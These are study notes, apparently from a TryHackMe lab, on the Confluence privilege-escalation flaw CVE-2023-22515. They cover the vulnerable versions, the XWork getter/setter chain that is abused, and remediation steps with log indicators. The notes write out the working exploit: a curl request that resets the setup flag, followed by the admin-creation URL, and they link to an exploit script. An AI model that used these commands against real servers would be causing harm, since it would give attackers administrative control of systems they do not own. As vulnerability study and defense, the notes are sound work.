# CVE-2023-22515

[munra at THM](https://tryhackme.com/room/confluence202322515): *"On October 4th, 2023, Atlassian released a [security advisory](https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html) regarding **CVE-2023-22515**, a broken access control vulnerability, with an assigned CVSS score of **10.0**. The vulnerability was introduced in version 8.0.0 of Confluence Server and Data Center editions and is present in versions `<8.3.3`, `<8.4.3`, `<8.5.2`. According to Atlassian, the vulnerability has already been exploited in the wild."*

The vulnerability can be exploited to create an additional account(s) in Confluence that have full administrative privileges. This is accomplished by re-enable the setup process post initial setup. This is due to Apache Struts framework, which depends on the XWork package that allows you to define Actions in the form of a Java class. 

## Exploit Quick and Dirty

...this is ridiculous 
```bash
# Set the setup complete object to false 
curl $confluenceServer/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
# Create an new Admin account
firefox $confluenceServer/setup/setupadministrator-start.action
```

[Chocapikk exploit script](https://github.com/Chocapikk/CVE-2023-22515) for those that want a python script.

## Explaination

- An Actions are invoked through a URL
- A corresponding class will handle each request to then return a response
- `execute()` method of the class will called by default

- XWorks specifics
	- Getters - get some data and returns the value
	- Setters - set some data to some value

- `ServerInfoAction` Action is exploited for CVE-2023-22515

`ConfluenceActionSupport` class is [extended](https://www.w3schools.com/java/ref_keyword_extends.asp) meaning that it is inherited from another class. Also it will inherit **ALL** it methods as well. 
```java
public class ConfluenceActionSupport extends ActionSupport implements LocaleProvider, WebInterface, MessageHolderAware {
  public BootstrapStatusProvider getBootstrapStatusProvider() {
    if (this.bootstrapStatusProvider == null)
      this.bootstrapStatusProvider = BootstrapStatusProviderImpl.getInstance(); 
    return this.bootstrapStatusProvider;
  }
}
```

For exploit the `BootstrapStatusProvider` class is important for retrieval of the `ApplicationConfiguration` object, which contain the applications configuration. 
```java
public class BootstrapStatusProviderImpl implements BootstrapStatusProvider, BootstrapManagerInternal {
  public ApplicationConfiguration getApplicationConfig() {
    return this.delegate.getApplicationConfig();
  }
}
```

We could then use the Setter method the Confluence setup configuration to false meaning that we could re-setup the Confluence application.
```java
public class ApplicationConfig implements ApplicationConfiguration {
  public synchronized void setSetupComplete(boolean setupComplete) {
    this.setupComplete = setupComplete;
  }  
}
```

Set the setup complete object to false 
```bash
curl $confluenceServer/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
```

The Java XWork would call: 
```java
getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)
```

Then we could create an new Admin account
```bash
firefox $confluenceServer/setup/setupadministrator-start.action
```

## Remediation

- Initially:
	- Check if you have a vulnerable version: 
		- Network access logs pointing to `/setup/*.action`. There's no reason for a regular user to request such URLs after installation.
		- Network access logs to `/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false`.
		- Review your Confluence users and look for suspicious accounts and members of the `confluence-administrators` group.
	- Patch to: 
		- 8.3.3
		- 8.4.3
		- 8.5.2

[munra at THM](https://tryhackme.com/room/confluence202322515): *If upgrading is not possible immediately, access to the `/setup/*` endpoints may be blocked as a temporary measure. To do so, add the following security constraint inside the `<web-app>` tag in `/<confluence-install-dir>/confluence/WEB-INF/web.xml`:*

```xml
<security-constraint>
  <web-resource-collection>
    <url-pattern>/setup/*</url-pattern>
    <http-method-omission>*</http-method-omission>
  </web-resource-collection>
  <auth-constraint />
</security-constraint>
```

This will effectively restrict the access to `/setup/*`.

## Further Reading

[THM Confluence CVE-2023-22515 Room](https://tryhackme.com/room/confluence202322515)  recommends reading the [Rapid7 analysis in attackerKB](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis?referrer=moreFromAKB).
## References

[THM Confluence CVE-2023-22515 Room](https://tryhackme.com/room/confluence202322515) 
[Atlassian security advisory](https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html)
[w3school - extend keyword](https://www.w3schools.com/java/ref_keyword_extends.asp)
[Rapid7 analysis in attackerKB](https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis?referrer=moreFromAKB).
[Chocapikk exploit script](https://github.com/Chocapikk/CVE-2023-22515)